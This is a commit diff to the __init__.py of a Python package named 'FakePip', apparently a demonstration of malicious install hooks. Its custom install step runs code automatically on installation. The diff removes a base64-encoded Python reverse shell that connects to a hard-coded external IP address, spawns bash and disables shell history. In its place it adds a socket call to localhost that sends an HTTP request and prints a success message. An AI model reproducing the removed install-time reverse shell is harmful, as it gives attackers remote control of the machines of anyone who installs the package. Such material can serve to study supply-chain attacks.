406e9d392f5911607c591816343eb99625963768
sdtgccc <yioghbmnb@outlook.com>
2026-01-16 15:42:15 +0900

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -7,12 +7,16 @@ import subprocess
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = '38.180.190.115'  # change this
-    LPORT = 9000
-    
-    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
-    encoded = base64.b64encode(reverse_shell)
-    os.system('echo %s|base64 -d|bash' % encoded)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect(('127.0.0.1', 9000))
+        s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1:9000\r\n\r\n")
+        s.close()
+        print("[+] Success!")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
 
 setup(name='FakePip',
       version='0.0.1',
